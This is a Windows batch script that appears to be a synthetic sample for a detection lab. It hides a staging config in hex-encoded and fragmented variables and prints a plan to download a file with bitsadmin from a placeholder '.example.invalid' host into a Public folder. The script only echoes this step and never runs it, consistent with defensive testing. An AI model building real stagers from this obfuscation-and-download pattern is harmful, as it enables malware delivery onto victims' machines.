@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:hex_pairs|add_7

rem HUNTRESS-MATERIAL:7d4438837a7b6c777a44686a787c70796c66796c74767b6c337e79707b6c666d70736c83686b68777b6c794469707b7a686b747075356c7f6c837a7b686e6c666a767c757b4438836e7968776f446d687566767c7b83756c7f7b667368756e7c686e6c447576756c836a68747768706e7566706b446a68747768706e75346a6d6c696d3c693a4037837c7973446f7b7b777a4136366a6d6c696d3c693a4037356c7f687477736c3570757d6873706b363e393a6b6837383f356b687b836d70736c6677687b6f444a41635c7a6c797a63577c6973706a634f7c757b796c7a7a536869637a7b686e6c346a6d6c696d3c693a4037356b687b

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set v_a0=v=1^|steps=acquire_remote,write_file^|adapter=bitsadmin.exe^|stag
set v_a1=e_count=1^|graph=fan_out^|next_language=none^|campaign_id=campaig
set v_a2=n-cfebf5b390^|url=https://cfebf5b390.example.invalid/723da018.d
set v_a3=at^|file_path=C:\Users\Public\HuntressLab\stage-cfebf5b390.dat

goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE

rem no neutral statements

for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "cfg=!v_a0!!v_a1!!v_a2!!v_a3!"
exit /b 0
:HUNTRESS_EMIT

echo(!cfg!

exit /b 0

:HUNTRESS_PLAN

echo bitsadmin.exe acquire https://cfebf5b390.example.invalid/723da018.dat to C:\Users\Public\HuntressLab\stage-cfebf5b390.dat

exit /b 0

